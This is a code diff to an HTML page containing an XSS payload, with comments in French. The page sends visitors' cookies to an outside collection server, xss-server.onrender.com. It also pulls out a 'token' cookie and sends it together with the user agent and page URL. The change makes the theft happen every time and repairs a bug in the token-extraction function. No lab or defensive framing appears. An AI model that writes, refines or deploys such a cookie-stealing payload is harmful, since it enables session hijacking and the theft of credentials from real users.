@@ -4,7 +4,7 @@
 <head><meta charset="UTF-8"><title>XSS</title></head>
 <body>
 <script>
-  // Envoi initial de tous les cookies comme tu l'as fait
+  // Envoi initial de tous les cookies
   fetch("https://xss-server.onrender.com/log?cookie=" + encodeURIComponent(document.cookie))
     .then(() => console.log("Cookie envoyé"));
 
@@ -15,19 +15,19 @@
       const [name, value] = cookie.split('=');
       if (name === 'token') return value;
     }
-    return value;
+    return 'no token'; // Toujours retourner une valeur (ici chaîne vide si pas trouvé)
   }
 
   const token = getToken();
   const userAgent = encodeURIComponent(navigator.userAgent);
   const currentUrl = encodeURIComponent(window.location.href);
 
-  if (token) {
-    const logUrl = `https://xss-server.onrender.com/log?token=${encodeURIComponent(token)}&userAgent=${userAgent}&url=${currentUrl}`;
-    fetch(logUrl)
-      .then(() => console.log("Token et infos envoyés"))
-      .catch(() => console.log("Erreur lors de l'envoi des infos"));
-  }
+  // Toujours envoyer, même si token est vide (modifie selon besoin)
+  const logUrl = `https://xss-server.onrender.com/log?token=${encodeURIComponent(token)}&userAgent=${userAgent}&url=${currentUrl}`;
+  fetch(logUrl)
+    .then(() => console.log("Token et infos envoyés"))
+    .catch(() => console.log("Erreur lors de l'envoi des infos"));
+
 </script>
 <h1>XSS payload actif</h1>
 </body>
